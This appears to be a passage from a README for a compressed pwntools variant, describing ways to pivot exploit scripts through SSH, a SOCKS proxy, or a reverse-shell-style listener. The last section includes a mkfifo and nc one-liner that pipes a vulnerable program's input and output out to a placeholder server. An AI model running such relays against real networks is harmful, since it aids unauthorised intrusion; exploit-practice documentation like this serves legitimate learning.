Compressing pwntools from ~30MB to ~30KB means I have to pull off some pretty hacky stuff. I'll try to add and fix what I can, but there are some things (ex. supporting multiple architectures) that I can't reasonably implement.

If this repository doesn't meet your needs, `pwntools` offers multiple solutions to let you 'pivot' your solution script through a host.

For instance, `pwntools` can SSH into a machine and attack processes/services on it:
```python
conn = ssh('blah', 'server.com', password='password')
p = conn.process("/home/blah/pwn.elf") # attack a local process
p = conn.remote("172.16.45.9",9001) # attack a remote server (through the connection)
# continue exploit as normal
```

If SSH is disabled, you can try setting up a SOCKS proxy:
```python
context.proxy = (2,'158.68.6.52',1081) # 2 for SOCKS5, 1 for SOCKS4
p = remote("192.168.0.6",9001) # this will connect through the proxy
# continue exploit as normal
```

If nothing else works, you can even send the vulnerable program over reverse-shell style:
```python
# on your solve script
s = server(8888)
info("Waiting for connection on port 8888...")
p = s.next_connection() 
# continue exploit as normal
```
```bash
# on the internal machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|./vulnerable_program 2>&1|nc <your-server-ip> 8888 >/tmp/f
```